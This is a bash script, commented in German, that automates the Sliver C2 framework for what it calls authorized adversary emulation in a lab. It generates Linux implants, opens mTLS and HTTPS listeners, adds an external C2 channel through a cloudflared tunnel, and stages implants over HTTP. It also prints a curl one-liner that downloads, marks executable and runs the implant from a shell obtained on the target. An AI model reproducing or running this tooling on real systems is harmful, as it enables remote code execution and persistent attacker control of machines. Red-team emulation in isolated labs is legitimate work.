#!/usr/bin/env bash
# Sliver C2 integration (BishopFox) — authorized adversary emulation in the isolated lab.
set -euo pipefail
ROOT="$(cd "$(dirname "$0")/.." && pwd)"
export LAB="$ROOT"
# shellcheck source=scripts/docker-env.sh
source "$ROOT/scripts/docker-env.sh"
ACTION="${1:-help}"
cd "$ROOT"
CONTAINER="vtbw-php2shell-sliver"
OUT="$ROOT/out/sliver"
mkdir -p "$OUT"

banner() {
  cat <<'EOF'
══════════════════════════════════════════════════════════════════
  Sliver C2 — Adversary Emulation (BishopFox, GPLv3)
  Nur autorisierte Red-Team-Tests. Lab-Ops: out/sliver/ops.log
══════════════════════════════════════════════════════════════════
EOF
}

ops_log() {
  mkdir -p "$OUT"
  printf '%s %s\n' "$(date -u +%Y-%m-%dT%H:%M:%SZ)" "$*" >>"$OUT/ops.log"
}

need_server() {
  if ! docker ps --format '{{.Names}}' | grep -qx "$CONTAINER"; then
    echo "Sliver-Server läuft nicht — sliver server-up" >&2
    exit 1
  fi
}

cmd_status() {
  banner
  echo "Binaries: $ROOT/third_party/sliver"
  [[ -x "$ROOT/third_party/sliver/sliver-server" ]] && echo "  server: OK" || echo "  server: FEHLT — fetch-sliver"
  if docker ps --format '{{.Names}}' | grep -qx "$CONTAINER"; then
    echo "  daemon: LÄUFT ($CONTAINER)"
  else
    echo "  daemon: gestoppt (sliver server-up)"
  fi
  cat <<EOF

Subcommands:
  server-up        Daemon starten (Compose-Profil sliver)
  operator         lab-Operator anlegen + client import (einmalig)
  console          Interaktive sliver-client Konsole
  listener         mTLS Listener 0.0.0.0:8888 (rc-Skript)
  http-listener    HTTPS Listener 0.0.0.0:8889 (für Tunnel/external)
  implant          Linux amd64 Implant → out/sliver/implant (mtls sliver:8888)
  implant-external HTTPS-C2 Implant via Tunnel-Host (braucht: tunnel up sliver-http)
  stage            HTTP-Server auf out/sliver + Paste-One-Liner für 'shell'
  ops              ops.log anzeigen
  down             Server stoppen

Ops-Log: $OUT/ops.log
EOF
}

cmd_server_up() {
  banner
  if [[ ! -x "$ROOT/third_party/sliver/sliver-server" ]]; then
    echo "FEHLER: fetch-sliver zuerst" >&2
    exit 1
  fi
  ops_log "server-up"
  docker compose --profile sliver build sliver
  docker compose --profile sliver up -d sliver
  echo "[sliver] warte auf Multiplayer-Port 31337 …"
  local i cfg
  for i in $(seq 1 60); do
    cfg="$(operator_cfg_name)"
    if [[ -n "$cfg" ]] && docker exec "$CONTAINER" /opt/sliver/sliver-client \
      --config "/out/$cfg" sessions >/dev/null 2>&1; then
      break
    fi
    sleep 2
  done
  docker logs "$CONTAINER" 2>&1 | tail -5
  echo "Next: sliver operator (einmalig) → sliver listener"
}

operator_cfg_name() {
  # Sliver speichert als <name>_<lhost>.cfg
  ls "$OUT"/lab_*.cfg 2>/dev/null | head -1 | xargs -r basename || true
}

cmd_operator() {
  need_server
  ops_log "operator lab"
  local cfg
  cfg="$(operator_cfg_name)"
  if [[ -n "$cfg" ]] && docker exec -i "$CONTAINER" /opt/sliver/sliver-client \
    --config "/out/$cfg" sessions >/dev/null 2>&1; then
    echo "Operator-Config existiert: $OUT/$cfg"
  else
    [[ -n "$cfg" ]] && echo "[sliver] Operator-Config veraltet (Server neu?) — neu anlegen …"
    rm -f "$OUT"/lab_*.cfg
    docker exec -i "$CONTAINER" /opt/sliver/sliver-server operator \
      --name lab --lhost 127.0.0.1 --permissions all --save /out/
    cfg="$(operator_cfg_name)"
  fi
  if [[ -z "$cfg" ]]; then
    echo "FEHLER: keine Operator-Config erzeugt" >&2
    exit 1
  fi
  echo "[sliver] import in client-Profil des Containers:"
  docker exec -i "$CONTAINER" /opt/sliver/sliver-client import "/out/$cfg" || true
  echo "[sliver] Fertig. Konsole: sliver console"
}

rc_run() {
  local name="$1"
  shift
  local rc="$OUT/rc-$name.rc" cfg out
  printf '%s\n' "$@" >"$rc"
  ops_log "rc-run $name"
  cfg="$(operator_cfg_name)"
  if [[ -z "$cfg" ]]; then
    echo "FEHLER: Operator fehlt — sliver operator" >&2
    exit 1
  fi
  out="$(docker exec -i "$CONTAINER" /opt/sliver/sliver-client \
    --config "/out/$cfg" --rc "/out/rc-$name.rc" 2>&1)" || true
  echo "$out"
  # rc-Fehler (z.B. unknown flag) setzen keinen Exit-Code — explizit erkennen.
  if printf '%s' "$out" | grep -aqE 'rc line [0-9]+:|root command: rc:' ; then
    echo "FEHLER: sliver rc '$name' fehlgeschlagen" >&2
    ops_log "rc-run $name FAILED"
    exit 1
  fi
}

cmd_listener() {
  need_server
  rc_run listener "mtls --lhost 0.0.0.0 --lport 8888" "jobs"
  echo "[sliver] mTLS listener: sliver:8888 (im Lab-Netz erreichbar)"
}

cmd_http_listener() {
  need_server
  rc_run http-listener "https --lhost 0.0.0.0 --lport 8889" "jobs"
  echo "[sliver] HTTPS listener: sliver:8889 (für Tunnel: tunnel sliver-http)"
}

cmd_implant() {
  need_server
  rc_run implant \
    "generate --mtls sliver:8888 --os linux --arch amd64 --format executable --save /out/implant"
  ops_log "implant generated"
  echo "[sliver] Implant: $OUT/implant* — Staging: sliver stage"
}

cmd_implant_external() {
  need_server
  local url_file="$ROOT/out/tunnel/sliver-http.url" url host
  if [[ ! -s "$url_file" ]]; then
    echo "FEHLER: kein sliver-http Tunnel — zuerst: tunnel up sliver-http (oder external up)" >&2
    exit 1
  fi
  url="$(cat "$url_file")"
  host="${url#https://}"
  host="${host%%/*}"
  if [[ -z "$host" ]]; then
    echo "FEHLER: Tunnel-URL unlesbar: $url" >&2
    exit 1
  fi
  echo "[sliver] Implant external: HTTPS-C2 via Tunnel → $host (Edge:443 → cloudflared → sliver:8889)"
  rc_run implant-external \
    "generate --http https://$host --os linux --arch amd64 --format executable --save /out/implant-external"
  ops_log "implant-external generated host=$host"
  echo "[sliver] Implant: $OUT/implant-external* — Staging: sliver stage"
}

cmd_stage() {
  if ! ls "$OUT"/implant* >/dev/null 2>&1; then
    echo "FEHLER: kein Implant in $OUT — sliver implant" >&2
    exit 1
  fi
  ops_log "stage implant"
  echo "[sliver] Staging-Server (attacker, Lab-Netz) auf :18080 für out/sliver …"
  docker compose --profile tools run --rm -d --name vtbw-php2shell-stage \
    -v "$OUT:/srv:ro" -w /srv attacker python3 -m http.server 18080 >/dev/null
  local imp
  imp="$(basename "$(ls "$OUT"/implant* | head -1)")"
  cat <<EOF

──► In der FPM/Chain-A Shell ([1] shell) ausführen:

  curl -fsSL http://attacker-run:18080/...   # Name je nach compose-run-Container
Besser: festes Netz-Alias. Einfachster Weg im Lab:

  1) Implant liegt in $OUT/$imp
     (externes Tunnel-C2: implant-external → Listener: sliver http-listener)
  2) Starte Listener:  sliver listener
  3) In 'shell' (www-data):
     curl -fsSL http://stage:18080/$imp -o /tmp/i && chmod +x /tmp/i && /tmp/i

  Der Stage-Container heißt 'vtbw-php2shell-stage' und hängt am Lab-Netz.
  Beenden: docker rm -f vtbw-php2shell-stage
EOF
}

cmd_ops() {
  tail -n 50 "$OUT/ops.log" 2>/dev/null || echo "(noch keine Ops)"
}

cmd_console() {
  need_server
  echo "[sliver] Interaktive Konsole (exit mit 'exit')"
  exec docker exec -it "$CONTAINER" /opt/sliver/sliver-client
}

cmd_down() {
  ops_log "down"
  docker compose --profile sliver down
}

case "$ACTION" in
  help|status) cmd_status ;;
  server-up) cmd_server_up ;;
  operator) cmd_operator ;;
  listener) cmd_listener ;;
  http-listener) cmd_http_listener ;;
  implant) cmd_implant ;;
  implant-external) cmd_implant_external ;;
  stage) cmd_stage ;;
  ops) cmd_ops ;;
  console) cmd_console ;;
  down) cmd_down ;;
  *) cmd_status; exit 2 ;;
esac
